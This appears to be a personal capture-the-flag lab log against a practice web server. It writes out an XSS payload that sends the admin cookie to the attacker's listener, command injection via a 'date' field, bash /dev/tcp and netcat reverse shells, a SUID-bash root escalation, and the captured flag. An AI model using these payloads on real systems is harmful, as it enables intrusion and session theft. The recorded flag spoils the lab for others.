@@ -1,0 +1,165 @@
+2024-04-06 Sat 07:27 PM Spawning machine, IP 10.10.11.8
+2024-04-06 Sat 07:29 PM nmap -sV 10.10.11.8
+2024-04-06 Sat 07:31 PM tool too long, running without -sV
+2024-04-06 Sat 07:32 PM server is running ssh, upnp
+
+SSH ATTACK
+2024-04-06 Sat 07:32 PM Running hydra -L Downloads/common_usernames.txt -p /usr/share/wordlists/rockyou.txt ssh://10.10.11.8  
+2024-04-06 Sat 07:35 PM failed, connection errors
+
+UPNP
+2024-04-06 Sat 07:38 PM using nmap to enumerate upnp devices on the server,
+version, etc via (nmap -sV -p 5000 10.10.11.8)
+2024-04-06 Sat 07:49 PM This yielded a VERY interesting response pasted below
+PORT     STATE SERVICE VERSION
+5000/tcp open  upnp?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V=7.94SVN%I=7%D=4/6%Time=6611FABA%P=x86_64-pc-linux-gnu%r(
+SF:GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x
+SF:20Python/3\.11\.2\r\nDate:\x20Sun,\x2007\x20Apr\x202024\x2001:45:29\x20
+SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
+SF:x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zf
+SF:s;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x
+SF:20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x
+SF:20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-widt
+SF:h,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Constructi
+SF:on</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20bo
+SF:dy\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x
+SF:20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20dis
+SF:play:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify
+SF:-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20a
+SF:lign-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200
+SF:,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE
+SF:\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\
+SF:x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x2
+SF:0\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respo
+SF:nse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\
+SF:n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20versi
+SF:on\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x
+SF:20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x2
+SF:0unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
+
+2024-04-06 Sat 07:49 PM This tells us that there is a web application running,
+using Werkzeug/2.2.2 and Python/3.11.2 so we can check for any known vulns
+there. We can also see that there is an is_admin cookie being passed, and that
+the page itself shows an "Under Construction"
+2024-04-06 Sat 07:51 PM The "is_admin" cookie is
+"InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zf" tbd if that's anything itself
+
+2024-04-06 Sat 07:53 PM running dirsearch (dirsearch -u http://10.10.11.8)
+found /dashboard with a 401. I bet we can access that if we have the right
+is_admin cookie
+2024-04-06 Sat 08:01 PM Going to try base64 decoding
+InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zf. ChatGPT seems to think it is base64 but
+I'm not so sure...it appears to decode to "user"¸￹f^Tï�￹�￹ò�￹�￹hð�￹�￹ðY
+2024-04-06 Sat 08:03 PM if we try and find just the components that translate
+to "user" and change that to admin... what happens? InVzZXIi decodes to "user"
+so let's replace that with the "admin" encoding ImFkbWluIg==, making the whole
+cookie is_admin=ImFkbWluIg==\.uAlmXlTvm8vyihjNaPDWnvB_Zf
+2024-04-06 Sat 08:14 PM That yielded a 500. Indicating that we likely failed
+some server-side validation. Now going with just is_admin=ImFkbWluIg== and this
+caused a timeout! Interesting.
+
+2024-04-08 Mon 08:57 AM Going to pivot to XSS based on some resources online.
+I'm going to assume that a certain payload may make it expose what the server
+is expecting the cookie to be.
+
+2024-04-08 Mon 09:17 AM Attempting a simple
+<script>alert(document.cookie)</script> yields a "hacking attempted!" screen!
+Let's try putting that same thing into other fields. Putting it in last name
+does nothing, first name does nothing, but email appears to be checking if it's
+a valid email field. Maybe that will do something. Nope doesn't work. Phone
+number? Also nothing.
+
+2024-04-08 Mon 09:23 AM We know we need to manipulate the data going into the
+"message" field, and we know that the web server is Werkzeug/2.2.2 Python/3.11.2
+2024-04-08 Mon 09:29 AM msfconsole exposes that Werkzeug has some exploits
+available
+2024-04-08 Mon 09:29 AM attempting to use exploit/multi/http/werkzeug_debug_rce
+2024-04-08 Mon 09:30 AM that exploit is only available on WZ 0.1 and older
+
+2024-04-08 Mon 09:37 AM Picking up here: https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e
+2024-04-08 Mon 09:57 AM TIL even if there is sanitation on input fields, you
+can also do XSS on things like the user agent field??
+
+2024-04-08 Mon 09:58 AM Setting up a web server locally to listen for replies,
+then we will use XSS to get the server to send us the admin cookie: python3 -m http.server 8001
+2024-04-08 Mon 09:59 AM Using an img to try to get the server to make a request
+from it to our server, sending along the admin cookie.
+
+2024-04-08 Mon 10:48 AM Sending modified request with User Agent "User-Agent:
+<script>var i=new Image();
+i.src="http://10.10.14.33:8001/?cookie="+btoa(document.cookie);</script>"
+
+2024-04-08 Mon 11:04 AM SUCCESS, payload shown below
+POST /support HTTP/1.1
+Host: 10.10.11.8:5000
+User-Agent: <script>var i=new Image(); i.src="http://10.10.14.33:8001/?cookie="+btoa(document.cookie);</script>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 66
+Origin: http://10.10.11.8:5000
+Connection: close
+Referer: http://10.10.11.8:5000/support
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+Upgrade-Insecure-Requests: 0
+
+fname=asdf&lname=asdf&email=asdf%40asdf.com&phone=123&message=asdf
+
+2024-04-08 Mon 11:04 AM Above payload sent the following to our listener:
+cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= base64
+decoding this gives us the actual cookie! is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+2024-04-08 Mon 11:05 AM Attempting to go to the /dashboard page now and put in
+the cookie, we can successfully access the admin dashboard.
+
+2024-04-09 Tue 12:12 PM Back for more. We can setup another listener now that
+we know the cookie, and see if we can gain access to the webserver itself.
+2024-04-09 Tue 12:23 PM (date=; ls -la) yields Systems are up and running! total 40 drwxr-xr-x 3 dvir dvir 4096 Feb 16 23:49 . drwx------ 8 dvir dvir 4096 Feb 16 23:49 .. -rwxr-xr-x 1 dvir dvir 2867 Sep 10 2023 app.py -rw-r--r-- 1 dvir dvir 2100 Sep 10 2023 dashboard.html -rw-r--r-- 1 dvir dvir 1513 Sep 9 2023 hackattempt.html drwxr-xr-x 2 dvir dvir 4096 Apr 8 20:03 hacking_reports -rw-r--r-- 1 dvir dvir 2896 Feb 16 23:35 index.html -rw-r--r-- 1 dvir dvir 1185 Feb 2 16:08 inspect_reports.py -rwxr-xr-x 1 dvir dvir 48 Sep 9 2023 report.sh -rw-r--r-- 1 dvir dvir 2457 Sep 9 2023 support.html 
+2024-04-09 Tue 12:23 PM (date=;pwd) yields /home/dvir/app
+2024-04-09 Tue 12:25 PM (date=; cd /; ls -la)
+2024-04-09 Tue 12:26 PM (date=;cd /home/dvir; cat user.txt) yields the flag! date=;cd /home/dvir; cat user.txt
+2024-04-09 Tue 12:27 PM flag found: 77e05ebdf22e630ef0d6b2e4afa28313
+
+2024-04-09 Tue 12:27 PM To get root, we will need to reverse shell: date=;bash
+-i >& /dev/tcp/<your_ip>/<listening_port> 0>&1 is the idea
+
+2024-04-09 Tue 12:36 PM After setting up a listener on my machine at (nc -lvp
+1234) and running (date=; echo "test" | nc 10.10.14.33) I received the test
+      message, but cannot yet get a good shell
+
+2024-04-09 Tue 01:18 PM Turns out the shell was working, I just needed to run
+commands. Successful payload was (date=;nc 10.10.14.33 1234 -e /bin/bash) now
+working out how to gain root access
+2024-04-09 Tue 01:21 PM Maybe we can modify /etc/passwd? We're able to read it.
+2024-04-09 Tue 01:22 PM Running openssl passwd -1 -salt mysalt password
+2024-04-09 Tue 01:24 PM Running (sudo -l) we see the following /usr/bin/syscheck
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+
+2024-04-09 Tue 01:25 PM I'm going to assume that the above means that the user
+can run that file without a password. That file seems to execute a script
+./initdb.sh and pipe the output to devnull. If we can modify that script, and
+then run the syscheck script, we can probably gain root?
+2024-04-09 Tue 01:42 PM The connection is incredibly flakey. I have to keep
+restarting my listener.
+
+2024-04-09 Tue 01:49 PM (echo "chmod u+s /bin/bash" > initdb.sh) to modify the
+initdb.sh file, when this runs it will give us access to run bash as root
+2024-04-09 Tue 01:50 PM (chmod +x initdb.sh) to make it executable
+2024-04-09 Tue 01:50 PM (sudo /usr/bin/syscheck) to run the one thing we can
+run as root with no password 
+2024-04-09 Tue 01:50 PM (/bin/bash -p) to now run bash as root
+
+2024-04-09 Tue 01:51 PM (whoami) shows root :) 
